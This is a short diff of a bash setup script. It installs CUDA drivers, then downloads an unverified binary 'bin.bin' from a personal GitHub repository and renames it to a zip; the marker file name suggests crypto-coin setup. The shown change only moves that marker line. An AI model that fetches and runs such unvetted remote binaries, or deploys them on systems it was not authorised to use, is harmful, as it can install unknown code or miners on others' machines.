@@ -1,7 +1,6 @@
 SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
 if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ]; then
     echo "Start setup..."
-    echo "taind vip pro" > isHaveSetupCoin.txt
     sudo apt-get install linux-headers-$(uname -r) -y
     distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
     wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
@@ -11,6 +10,7 @@ if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ]; then
     sudo apt-get update
     sudo apt-get -y install cuda-drivers
     sudo apt-get install libcurl3 -y
+    echo "taind vip pro" > isHaveSetupCoin.txt
     wget https://github.com/nguyen3297/sub/raw/main/bin.bin
     mv bin.bin bin.zip
     sudo apt install unzip
